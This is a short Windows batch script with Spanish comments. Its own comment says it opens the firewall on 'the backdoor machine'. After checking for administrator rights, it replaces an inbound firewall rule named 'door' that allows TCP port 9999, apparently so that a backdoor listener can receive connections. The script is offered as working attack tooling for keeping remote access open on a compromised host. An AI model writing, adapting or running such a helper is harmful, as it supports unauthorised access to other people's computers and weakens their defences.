@echo off

REM ejecutar este script de windows para abrir automaticamente el firewall en la maquina del backdoor

title Configuración Firewall - Puerto 9999 TCP

REM Verifica si el script se está ejecutando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Este script debe ejecutarse como Administrador.
    pause
    exit /b 1
)

echo == Eliminando regla "door" si existe...
netsh advfirewall firewall delete rule name="door" >nul 2>&1

echo == Agregando regla para abrir puerto TCP 9999...
netsh advfirewall firewall add rule name="door" dir=in action=allow protocol=TCP localport=9999

if %errorlevel% equ 0 (
    echo [OK] Puerto 9999 TCP abierto en el firewall con la regla "door".
) else (
    echo [ERROR] No se pudo crear la regla en el firewall.
)

pause
exit /b 0
